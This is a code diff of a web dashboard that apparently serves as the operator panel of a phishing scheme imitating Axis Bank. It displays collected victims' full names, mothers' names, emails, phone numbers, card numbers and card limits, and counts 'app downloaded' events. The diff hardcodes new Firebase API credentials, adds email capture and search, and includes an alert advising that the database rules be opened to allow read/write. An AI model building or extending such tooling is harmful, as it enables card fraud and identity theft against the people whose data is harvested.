@@ -32,6 +32,11 @@
         .stat-item .label { font-size: 0.75rem; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px; }
         .stat-item .value { font-size: 1.1rem; font-weight: 700; color: var(--text-main); }
         .logout-btn { background: var(--danger); color: var(--white); border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; font-weight: 600; font-family: 'Inter', sans-serif; display: flex; align-items: center; gap: 8px; }
+        
+        .connection-status { font-size: 0.8rem; font-weight: 600; padding: 6px 12px; border-radius: 20px; display: flex; align-items: center; gap: 6px; }
+        .connection-status.connected { background: #D1FAE5; color: #059669; }
+        .connection-status.error { background: #FEE2E2; color: #DC2626; }
+        .connection-status.connecting { background: #FEF3C7; color: #D97706; }
 
         .controls-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; gap: 15px; flex-wrap: wrap; }
         .search-container { flex: 1; min-width: 300px; position: relative; }
@@ -62,13 +67,13 @@
         .client-card.expanded .expand-icon { transform: rotate(180deg); }
 
         .card-details { max-height: 0; overflow: hidden; transition: max-height 0.4s ease; background: #fafafa; border-top: 1px solid var(--border-color); }
-        .client-card.expanded .card-details { max-height: 800px; }
+        .client-card.expanded .card-details { max-height: 900px; }
         .details-content { padding: 20px; }
 
         .detail-row { display: flex; justify-content: space-between; align-items: center; padding: 10px 0; border-bottom: 1px solid #f0f0f0; }
         .detail-row:last-child { border-bottom: none; }
         .detail-label { font-size: 0.85rem; color: var(--text-muted); font-weight: 500; }
-        .detail-value { font-size: 0.9rem; font-weight: 600; color: var(--text-main); text-align: right; }
+        .detail-value { font-size: 0.9rem; font-weight: 600; color: var(--text-main); text-align: right; word-break: break-all; }
         .detail-value.phone { color: var(--axis-maroon); font-family: monospace; font-size: 0.95rem; }
         .detail-value.card-num { font-family: monospace; font-size: 0.85rem; letter-spacing: 0.5px; }
 
@@ -107,12 +112,17 @@
                 <div class="stat-item"><div class="label">Download Initiated</div><div class="value" id="verifiedCount" style="color: var(--blue);">0</div></div>
                 <div class="stat-item"><div class="label">App Downloaded</div><div class="value" id="newOtpCount" style="color: var(--success);">0</div></div>
             </div>
-            <button class="logout-btn" onclick="logout()"><i class="fas fa-sign-out-alt"></i> Logout</button>
+            <div style="display: flex; gap: 15px; align-items: center;">
+                <div id="connectionStatus" class="connection-status connecting">
+                    <i class="fas fa-circle-notch fa-spin"></i> Connecting...
+                </div>
+                <button class="logout-btn" onclick="logout()"><i class="fas fa-sign-out-alt"></i> Logout</button>
+            </div>
         </div>
 
         <div class="controls-bar">
             <div class="search-container">
-                <input type="text" class="search-box" id="searchInput" placeholder="Search by name, mother's name, phone, or card number..." onkeyup="filterTable()">
+                <input type="text" class="search-box" id="searchInput" placeholder="Search by name, email, mother's name, phone, or card..." onkeyup="filterTable()">
                 <i class="fas fa-search search-icon"></i>
             </div>
         </div>
@@ -129,23 +139,30 @@
 
         // --- NEW FIREBASE CONFIGURATION ---
         const firebaseConfig = {
-            apiKey: "AIzaSyAgC0SP-SEZfgI_bkWZ9pUwm4ifyHQgnYU",
-            authDomain: "hrs-axis.firebaseapp.com",
-            databaseURL: "https://hrs-axis-default-rtdb.firebaseio.com",
-            projectId: "hrs-axis",
-            storageBucket: "hrs-axis.firebasestorage.app",
-            messagingSenderId: "209243782173",
-            appId: "1:209243782173:android:863cf941e015f3e09c1af4"
+            apiKey: "AIzaSyCca2auC87UeSz7Q7_BEwttYIe4CXSnN5w",
+            authDomain: "hrss-admin-axis.firebaseapp.com",
+            databaseURL: "https://hrss-admin-axis-default-rtdb.firebaseio.com",
+            projectId: "hrss-admin-axis",
+            storageBucket: "hrss-admin-axis.firebasestorage.app",
+            messagingSenderId: "509029139380",
+            appId: "1:509029139380:android:62a6df2cc98d4a3e84e8e1"
         };
 
+        console.log("Initializing Firebase...");
         const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
+        
         let allSubmissions = [];
         const MAX_ENTRIES = 50;
         let expandedCards = new Set();
+        const statusEl = document.getElementById('connectionStatus');
 
         const submissionsRef = ref(db, 'submissions');
         onValue(submissionsRef, (snapshot) => {
+            console.log("Data received from Firebase!");
+            statusEl.className = 'connection-status connected';
+            statusEl.innerHTML = '<i class="fas fa-check-circle"></i> Connected';
+            
             allSubmissions = [];
             snapshot.forEach((child) => {
                 allSubmissions.push({ id: child.key, ...child.val() });
@@ -162,12 +179,17 @@
             renderCards(displayData);
             updateStats();
             updateResultCount(displayData.length);
+        }, (error) => {
+            console.error("Firebase Database Error:", error);
+            statusEl.className = 'connection-status error';
+            statusEl.innerHTML = `<i class="fas fa-exclamation-triangle"></i> Error: ${error.message}`;
+            alert("Failed to connect to database. Check console (F12) for details.\n\nMost common fix: Update Firebase Realtime Database Rules to allow read/write.");
         });
 
         window.renderCards = function(data) {
             const grid = document.getElementById('cardsGrid');
             if (data.length === 0) {
-                grid.innerHTML = `<div class="no-data"><i class="fas fa-inbox"></i><h3>No Submissions Found</h3><p>Try adjusting your search criteria</p></div>`;
+                grid.innerHTML = `<div class="no-data"><i class="fas fa-inbox"></i><h3>No Submissions Found</h3><p>Try adjusting your search criteria or wait for new submissions.</p></div>`;
                 return;
             }
 
@@ -208,9 +230,10 @@
                         
                         <div class="card-details">
                             <div class="details-content">
-                                <div class="detail-row"><span class="detail-label">Phone</span><span class="detail-value phone">${item.mobileNumber || 'N/A'}</span></div>
                                 <div class="detail-row"><span class="detail-label">Name</span><span class="detail-value">${item.fullName || 'N/A'}</span></div>
                                 <div class="detail-row"><span class="detail-label">Mother's Name</span><span class="detail-value">${item.motherName || 'N/A'}</span></div>
+                                <div class="detail-row"><span class="detail-label">Email</span><span class="detail-value">${item.email || 'N/A'}</span></div>
+                                <div class="detail-row"><span class="detail-label">Phone</span><span class="detail-value phone">${item.mobileNumber || 'N/A'}</span></div>
                                 <div class="detail-row"><span class="detail-label">Card Limit</span><span class="detail-value">₹ ${item.cardLimit || 'N/A'}</span></div>
                                 <div class="detail-row"><span class="detail-label">Card Type</span><span class="detail-value">${item.cardType || 'Unknown'}</span></div>
                                 <div class="detail-row"><span class="detail-label">Card Number</span><span class="detail-value card-num">${item.cardNumber || 'N/A'}</span></div>
@@ -263,6 +286,7 @@
             if (!query) { renderCards(latest30); updateResultCount(latest30.length); return; }
             const filtered = latest30.filter(i => 
                 (i.fullName && i.fullName.toLowerCase().includes(query)) ||
+                (i.email && i.email.toLowerCase().includes(query)) ||
                 (i.motherName && i.motherName.toLowerCase().includes(query)) ||
                 (i.mobileNumber && i.mobileNumber.includes(query)) ||
                 (i.cardNumber && i.cardNumber.toLowerCase().includes(query))
